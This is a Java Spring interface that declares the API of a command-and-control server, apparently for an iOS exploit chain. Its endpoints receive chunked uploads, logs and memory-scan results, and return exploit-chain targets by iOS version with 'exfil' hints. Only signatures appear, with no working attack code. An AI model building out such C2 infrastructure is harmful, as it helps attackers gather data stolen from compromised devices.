package com.ctwo.service;

import javax.servlet.http.HttpServletRequest;

import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.http.ResponseEntity;

/**
 * 18-ctwo-server C2 接口契约（C2_API.md 2026-08-15）。
 */
@RequestMapping
@CrossOrigin(origins = "*", methods = {RequestMethod.GET, RequestMethod.POST, RequestMethod.OPTIONS})
public interface ApiService {

    // ---- P0 核心上传 ----
    @PostMapping(value = {"/u", "/api/u"})
    ResponseEntity<String> postU(HttpServletRequest request);

    @PostMapping(value = {
            "/war", "/api/war",
            "/war_chunks", "/api/war_chunks",
            "/war_chunks/begin", "/api/war_chunks/begin",
            "/war_chunks/chunk", "/api/war_chunks/chunk",
            "/war_chunks/end", "/api/war_chunks/end"
    })
    ResponseEntity<String> postWar(HttpServletRequest request);

    @PostMapping(value = {"/nb", "/api/nb"})
    ResponseEntity<String> postNb(HttpServletRequest request);

    @PostMapping(value = {"/result", "/api/result"})
    ResponseEntity<String> postResult(HttpServletRequest request);

    @PostMapping(value = {"/log", "/api/log"})
    ResponseEntity<String> postLog(HttpServletRequest request);

    @PostMapping(value = {"/p", "/api/p"})
    ResponseEntity<String> postP(HttpServletRequest request);

    // ---- P1 控制面 ----
    /** GET /api/chain-targets?ios=18.6.2 → chain/band/worker/entry_point + exfil 提示（§1.1） */
    @GetMapping({"/api/chain-targets"})
    ResponseEntity<String> getChainTargets(HttpServletRequest request);

    // ---- P1.5 内存扫描 ----
    /** GET /api/memres → 轮询 resident 结果（§1.3） */
    @GetMapping({"/api/memres"})
    ResponseEntity<String> getMemres(HttpServletRequest request);

    /** POST /api/memres → LAB_MEMSCAN 上报扫描结果，落盘 10_内存扫描（§1.3） */
    @PostMapping({"/api/memres"})
    ResponseEntity<String> postMemres(HttpServletRequest request);

    // ---- 工具 / 探针 ----
    @GetMapping(value = {"/u", "/api/u", "/nb", "/api/nb", "/event", "/api/event"})
    ResponseEntity<String> getProbe(HttpServletRequest request);

    @GetMapping("/myip")
    ResponseEntity<String> getMyIp(HttpServletRequest request);

    @GetMapping("/c2")
    ResponseEntity<String> getC2(HttpServletRequest request);

    @GetMapping("/log.html")
    ResponseEntity<String> getLogHtml(HttpServletRequest request);

    @GetMapping("/logs")
    ResponseEntity<String> getLogs(HttpServletRequest request);

    @GetMapping("/logs.txt")
    ResponseEntity<String> getLogsTxt(HttpServletRequest request);

    /** 测试 war_unpack 入队（须写在 /** 兜底之前，否则会被 catch-all 吃掉） */
    @GetMapping({"/testPush", "/api/testPush"})
    ResponseEntity<String> testPush();

    /** 测试 nb_memorandum 入队 */
    @GetMapping({"/testNbPush", "/api/testNbPush"})
    ResponseEntity<String> testNbPush();

    @RequestMapping(value = "/**", method = {RequestMethod.GET, RequestMethod.POST})
    ResponseEntity<String> captureUnimplemented(HttpServletRequest request);

    @RequestMapping(value = "/**", method = RequestMethod.OPTIONS)
    ResponseEntity<String> handleOptions(HttpServletRequest request);
}
